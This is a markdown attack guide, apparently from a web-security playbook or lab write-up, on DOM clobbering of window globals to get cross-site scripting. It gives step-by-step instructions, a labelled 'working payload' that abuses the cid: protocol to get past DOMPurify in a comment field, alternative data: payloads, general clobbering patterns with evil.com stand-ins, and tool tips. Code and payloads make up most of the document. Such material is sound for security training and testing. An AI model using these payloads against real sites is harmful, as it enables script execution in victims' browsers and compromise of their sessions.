# DOM Clobbering — Window Globals (XSS via `||` Defaults)

## When this applies

The application has an HTML injection sink that allows attacker-controlled `<a>`, `<form>`, `<input>` elements with `id` / `name` attributes (typically permitted by DOMPurify, HTMLJanitor). The page reads `window.someConfig || defaultConfig` or `if (window.x)` patterns. Clobbering creates a global JS variable from injected HTML, redirecting the code path through attacker-controlled values.

## Technique

DOM clobbering exploits how HTML elements with `id` or `name` attributes create global JavaScript variables.

**Basic concept:**
```html
<a id="admin"></a>

<script>
window.admin // References the <a> element
typeof admin // "object" (HTMLAnchorElement)
</script>
```

### How DOM Clobbering Works

**Single element clobbering:**
```html
<a id="username"></a>

<script>
// JavaScript code expects
if (username === 'admin') { /* privileged access */ }

// But username is now an HTMLAnchorElement
</script>
```

**Multi-element clobbering (property access):**
```html
<a id="config"></a>
<a id="config" name="apiUrl" href="https://evil.com"></a>

<script>
config // HTMLCollection with 2 elements
config.apiUrl // href value of second element: "https://evil.com"
</script>
```

## Steps

### Pattern — Clobber `window.defaultAvatar` to Enable XSS via `cid:` Protocol

#### Vulnerable Code
```javascript
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'};
let avatarImg = document.createElement('img');
avatarImg.src = defaultAvatar.avatar;
```

#### Vulnerability Analysis
- **Pattern:** `||` operator with window property
- **Clobbering target:** `window.defaultAvatar`
- **Property needed:** `.avatar` sub-property
- **Sanitization:** DOMPurify used but allows `cid:` protocol
- **Attack:** Clobber with two anchors, use cid: for attribute breakout

#### Step-by-Step Solution

1. Identify the `window.defaultAvatar || {}` pattern.
2. Create two anchors with same id to make a collection.
3. Use name attribute to create `.avatar` property.
4. Use `cid:` protocol (allowed by DOMPurify).
5. Inject `"` via cid: to break attribute context.
6. Submit comment with payload.
7. XSS executes when comment loads.

#### Working Payload

**Comment body:**
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

#### How the Clobbering Works

**Step 1 - HTML creates collection:**
```html
<a id=defaultAvatar></a>
<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"></a>
```

**Step 2 - JavaScript accesses:**
```javascript
window.defaultAvatar
// HTMLCollection [<a id=defaultAvatar>, <a id=defaultAvatar name=avatar>]

window.defaultAvatar.avatar
// Second element's href: "cid:&quot;onerror=alert(1)//"
```

**Step 3 - Code execution:**
```javascript
let defaultAvatar = window.defaultAvatar; // Collection, truthy!
let avatarImg = document.createElement('img');
avatarImg.src = defaultAvatar.avatar; // "cid:&quot;onerror=alert(1)//"
document.body.appendChild(avatarImg);
```

**Step 4 - Rendered HTML:**
```html
<img src="cid:"onerror=alert(1)//">
```

The `cid:` protocol doesn't encode quotes, so:
```html
<img src="cid:" onerror=alert(1)//">
```

#### Why This Works

**1. Two elements with same id create collection:**
```javascript
<a id="x"></a>
<a id="x"></a>
// window.x = HTMLCollection
```

**2. Name attribute creates property:**
```javascript
<a id="x" name="prop" href="value"></a>
// window.x.prop = "value" (the href)
```

**3. cid: protocol doesn't encode:**
```
cid:&quot; → Rendered as: cid:"
```

**4. Quote breaks attribute:**
```html
<img src="cid:" onerror=alert(1)//">
```

#### Why DOMPurify Doesn't Block This

DOMPurify allows:
- `<a>` tags
- `id` attributes
- `name` attributes
- `href` attributes
- `cid:` protocol (used for email content IDs)

But it doesn't prevent DOM clobbering attacks!

#### Alternative Protocols

```html
<!-- Using cid: (works) -->
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

<!-- Using data: (may work) -->
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="data:text/html,<script>alert(1)</script>">

<!-- Note: javascript: is typically blocked by DOMPurify -->
```

### General Clobbering Patterns

#### Basic Clobbering

**1. Single element:**
```html
<img id="admin">

<script>
typeof admin // "object" (HTMLImageElement)
</script>
```

**2. Form with named input:**
```html
<form id="config">
    <input name="apiUrl" value="https://evil.com">
</form>

<script>
config.apiUrl.value // "https://evil.com"
</script>
```

**3. Anchor with name:**
```html
<a id="settings" name="theme" href="dark"></a>

<script>
settings.theme // The anchor element
settings.theme.href // "dark"
</script>
```

#### Advanced Clobbering

**1. Multiple elements (HTMLCollection):**
```html
<a id="config"></a>
<a id="config" name="url" href="https://evil.com"></a>

<script>
config // HTMLCollection [<a>, <a>]
config.url // href of second element
</script>
```

**2. Nested properties:**
```html
<form id="app">
    <form id="settings">
        <input name="debug" value="true">
    </form>
</form>

<script>
app.settings.debug.value // "true"
</script>
```

**3. Clobbering arrays:**
```html
<a id="users"></a>
<a id="users" name="length" href="0"></a>

<script>
users.length // href value "0" (string, not number!)
</script>
```

#### Finding Clobberable Patterns

**Vulnerable code patterns:**
```javascript
// Pattern 1: OR with window property
let config = window.config || {default: 'value'};

// Pattern 2: Direct property access
if (window.admin) { /* privileged */ }

// Pattern 3: Property checks
if (settings && settings.debug) { eval(settings.debug); }

// Pattern 4: Array-like access
for (let i = 0; i < items.length; i++) { /* ... */ }
```

**Using DOM Invader:**
1. Enable DOM Invader
2. Navigate to target page
3. DOM Invader highlights clobberable variables
4. Check "DOM clobbering" tab for opportunities
5. Test payloads manually

#### Complete Attack Flow (cid: Pattern)

1. **Attacker posts comment** with clobbering anchors
2. **DOMPurify sanitizes** but allows the payload
3. **Browser creates** `window.defaultAvatar` as HTMLCollection
4. **JavaScript checks** `window.defaultAvatar || {}` - collection is truthy
5. **Code accesses** `defaultAvatar.avatar` - gets href value
6. **img.src is set** to `cid:&quot;onerror=alert(1)//`
7. **Browser renders** with unencoded quote
8. **Attribute breaks** and onerror handler executes
9. **XSS achieved** when victim views comment

## Verifying success

- `window.<clobberedName>` in DevTools console returns an `HTMLCollection` or DOM element instead of `undefined` / expected default.
- Downstream code uses the clobbered value (sink fires, redirect happens, alert triggers).
- Removing the injected HTML restores baseline behavior.

## Common pitfalls

1. **`name` only works on certain elements** — `<a>`, `<form>`, `<iframe>`, `<img>`, `<embed>`, `<object>`. Not all tags create named properties.
2. **Sanitizer strips `id`** — DOMPurify allows id by default, but stricter configs may not. Test what's actually permitted.
3. **Browser version matters** — exact behavior varies by browser version, though Chrome / Firefox / Safari / Edge all support the basic patterns.
4. **`Object.prototype.toString` exposes clobbering** — `[object HTMLCollection]` is detectable; defenders can check.
5. **`javascript:` blocked by DOMPurify** — alternative protocols (`cid:`, `data:`) may slip through.

## Tools

- **DOM Invader** — DOM clobbering tab highlights clobberable globals
- **DevTools Console** — `Object.keys(window).filter(k => window[k] instanceof HTMLElement)` to find clobbered properties
- **PortSwigger DOM clobbering research** — pattern catalog
- **DOMPurify config audit** — review allowed tags/attrs for clobberable combinations

## Related

- `dom-clobbering-sanitizer-bypass.md` — clobbering DOM properties (e.g. `node.attributes`) to defeat sanitizer loops
